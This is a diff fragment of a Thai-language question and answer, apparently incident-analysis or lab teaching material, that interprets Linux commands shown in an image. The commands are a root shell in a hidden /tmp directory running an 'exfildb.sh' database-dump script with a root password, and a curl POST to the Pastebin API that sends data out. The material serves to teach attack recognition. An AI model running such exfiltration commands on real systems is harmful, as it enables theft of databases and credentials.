@@ -90,12 +90,15 @@ Q: จากในภาพคำสั่งทั้งหมดจาก Linu
 ```
 PING mysql-m1.prod.htb (10.10.20.14)
 ```
+
 ```
 root@web-m1:/tmp/.h4x# ./exfildb.sh mysql-m1.prod.htb 3306 root p4ssw0rd dbdump
 ```
+
 ```
 curl -d "api_user_key=..." https://pastebin.com/api/api_post.php
 ```
+
 หมายความว่า
 
 - มี shell prompt (root@web-m1:/tmp/.h4x#) ซึ่งเป็น session ของเครื่อง Linux ฝั่ง remote
